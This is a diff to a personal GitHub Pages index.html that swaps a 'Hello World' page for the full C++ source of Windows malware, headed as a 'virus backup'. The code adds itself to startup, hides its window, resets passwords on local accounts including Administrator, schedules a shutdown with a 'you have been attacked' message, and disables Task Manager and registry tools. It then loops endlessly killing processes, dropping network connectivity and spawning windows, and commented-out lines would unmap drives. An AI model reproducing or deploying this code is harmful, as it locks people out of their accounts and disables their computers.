@@ -4,7 +4,96 @@
     <title>Wangshuzhi's GitHub Pages.</title>
 </head>
 <body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.</p>
+<h1>c++病毒备份</h1>
+<p>
+#include <windows.h>
+    #include <bits/stdc++.h>
+    #include <unistd.h>
+    #include <Shlobj.h>
+    #include <fstream>
+    #include <tchar.h>
+    #include <stdio.h>
+    #include <ctime>
+    #include <stdlib.h>
+    #pragma comment(lib, "shell32.lib")
+    using namespace std;
+    bool AutoRun_Startup(){
+        TCHAR FileName[255];
+        GetModuleFileName(NULL, FileName, 255);
+        char *Register = (char*)"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+        HKEY hkey;
+        RegOpenKeyExA(HKEY_CURRENT_USER, Register, 0, KEY_ALL_ACCESS, &hkey);
+        RegSetValueExA(hkey, "Windows", 0, REG_SZ, (BYTE *)FileName, strlen(FileName));
+        RegCloseKey(hkey);
+    }
+    
+    void ModifyPassword(char pass2[100])
+    {
+        char cmd1[0x100];
+        char username1[100];
+        DWORD c = 150;
+        ::GetUserName(username1, &c);
+        char username2[100];
+        sprintf(username2, "%S", username1);
+        sprintf(cmd1, "%s%s%s%s", "net user ", username2, " ", pass2);
+        system(cmd1);
+    }
+    BOOL DeleteDrive(TCHAR *SThide){
+        if (!DefineDosDevice(DDD_RAW_TARGET_PATH, SThide, "")){
+            return false;
+        }
+        else{
+            return true;
+        }
+    }
+    int main(){
+        AutoRun_Startup();
+        /*if (DeleteDrive("C:") && DeleteDrive("D:")){
+            cout << "";
+        }
+        DefineDosDevice(DDD_RAW_TARGET_PATH, "C:", "//??//C://winnt");*/
+        HWND hwnd;
+        hwnd = FindWindow("ConsoleWindowClass", NULL);
+        if (hwnd){
+            ShowWindow(hwnd, SW_HIDE);
+        }
+        HWND hWnd;
+        HMENU hmenu = GetSystemMenu(hWnd, false);
+        RemoveMenu(hmenu, SC_CLOSE, MF_BYCOMMAND);
+        LONG style = GetWindowLong(hWnd, GWL_STYLE);
+        style &= ~(WS_MINIMIZEBOX);
+        SetWindowLong(hWnd, GWL_STYLE, style);
+        SetWindowPos(hWnd, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+        ShowWindow(hWnd, SW_SHOWNORMAL);
+        DestroyMenu(hmenu);
+        ReleaseDC(hWnd, NULL);
+        srand(time(0));
+        // ModifyPassword((char*)(rand()%1000000000+1));
+        system("net user HPuser 6943738");
+        system("net user NULL_ 6943738");
+        system("net user Administrator 1053865");
+        HWND hWnd1 ;
+        hWnd1 = GetConsoleWindow();
+        SetWindowLong(hWnd1, GWL_EXSTYLE, WS_EX_TOOLWINDOW);
+        TCHAR FileName[255];
+        GetModuleFileName(NULL, FileName, 255);
+        system("shutdown -s -t 600 -c \"你被攻击了\"") ;
+        HKEY hkey;
+        DWORD value = 1;
+        RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
+        RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
+        RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
+        RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"C:\\", 3);
+        RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
+        RegCloseKey(hkey);
+        while(1){
+            system("taskkill /f /im taskmgr.exe");
+            system("ipconfig /release");
+            new long long int;
+            system("start cmd");
+            SetCursorPos(rand()%1000,rand()%1000);
+        }
+    }
+</p>
 </body>
 </html>
